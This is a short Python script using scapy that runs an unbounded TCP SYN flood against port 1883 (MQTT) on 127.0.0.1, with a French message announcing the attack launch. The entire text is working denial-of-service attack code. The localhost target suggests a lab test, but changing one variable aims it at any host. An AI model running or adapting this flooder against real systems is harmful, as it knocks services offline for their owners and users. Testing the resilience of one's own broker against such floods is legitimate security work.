from scapy.all import IP, TCP, send, RandShort

# Target configuration
target_ip = "127.0.0.1"
target_port = 1883

print(f"🚀 Lancement de l'attaque TCP SYN Flood sur {target_ip}:{target_port}")

while True:
    pkt = IP(dst=target_ip) / TCP(
        dport=target_port,
        sport=RandShort(),
        flags="S"  # SYN flag
    )
    send(pkt, verbose=False)
